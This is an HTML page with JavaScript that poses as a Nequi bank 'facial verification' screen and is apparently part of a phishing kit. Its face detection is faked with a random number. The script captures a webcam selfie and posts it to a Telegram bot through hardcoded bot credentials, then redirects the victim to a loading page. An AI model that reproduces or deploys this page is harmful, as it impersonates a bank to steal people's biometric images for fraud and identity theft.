<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Facial - Nequi</title>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* 🔥 ALERTA SELFIE */
.alerta-selfie{
    position:fixed;
    top:20px;
    left:50%;
    transform:translateX(-50%);
    background:rgba(0,0,0,0.85);
    color:#fff;
    padding:15px 20px;
    border-radius:15px;
    font-size:14px;
    text-align:center;
    max-width:90%;
    z-index:9999;
    opacity:0;
    transition:0.4s;
}
.alerta-selfie.show{
    opacity:1;
}

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.oval.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
}

/* Texto */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
}

/* Warning */
.warning-message {
    position: absolute;
    top: 80px;
    left: 50%;
    transform: translateX(-50%);
    background: red;
    color: white;
    padding: 10px 20px;
    border-radius: 20px;
    display:none;
}
.warning-message.show{
    display:block;
}
</style>
</head>

<body>

<!-- 🔥 ALERTA INSTRUCCIONES -->
<div id="alertaSelfie" class="alerta-selfie">
📸 Para una mejor selfie:<br>
• Sin gorra 🧢<br>
• Sin gafas 🕶️<br>
• Buena iluminación 💡<br>
• Rostro centrado y visible
</div>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>
<div class="oval" id="oval"></div>

<div class="warning-message" id="warningMessage">
⚠️ Coloca tu rostro en el círculo
</div>

<div class="status" id="status">
🎯 Coloca tu rostro en el círculo
</div>

<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const warningMessage = document.getElementById("warningMessage");

/* 🔥 ALERTA 5 SEGUNDOS */
const alertaSelfie = document.getElementById("alertaSelfie");
window.addEventListener("load", ()=>{
    alertaSelfie.classList.add("show");
    setTimeout(()=>{
        alertaSelfie.classList.remove("show");
    },5000);
});

/* CONFIG TELEGRAM */
const TELEGRAM_CONFIG = {
    token: "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA",
    chatId: "7158969671"
};

let photoTaken = false;

/* CAMARA */
navigator.mediaDevices.getUserMedia({ video:true })
.then(stream=>{
    video.srcObject = stream;
})
.catch(()=>{
    statusText.innerText="❌ Error cámara";
});

/* DETECCIÓN SIMPLE + CAPTURA */
setInterval(()=>{
    if(photoTaken) return;

    const random = Math.random();

    if(random > 0.6){
        oval.classList.add("valid");
        warningMessage.classList.remove("show");
        statusText.innerText="✅ Rostro detectado";

        takePhotoAndSend(); // 🔥 AQUÍ SE DISPARA
    }else{
        oval.classList.remove("valid");
        warningMessage.classList.add("show");
        statusText.innerText="🎯 Coloca tu rostro en el círculo";
    }

},1500);

/* TOMAR FOTO */
function takePhotoAndSend(){
    if(photoTaken) return;
    photoTaken = true;

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");

    enviarATelegram(imageData);
}

/* ENVIAR A TELEGRAM */
function enviarATelegram(imgData){
    const blob = dataURLtoBlob(imgData);
    const formData = new FormData();

    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('photo', blob, 'selfie.png');

    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(()=>{
        statusText.innerText="✅ Selfie";
        setTimeout(()=>{
            window.location.href="loading.html";
        },3000);
    })
    .catch(()=>{
        statusText.innerText="❌ Error envío";
        photoTaken = false;
    });
}

/* CONVERTIR */
function dataURLtoBlob(dataURL){
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);

    while(n--){
        u8arr[n] = bstr.charCodeAt(n);
    }

    return new Blob([u8arr], { type: mime });
}
</script>

</body>
</html>
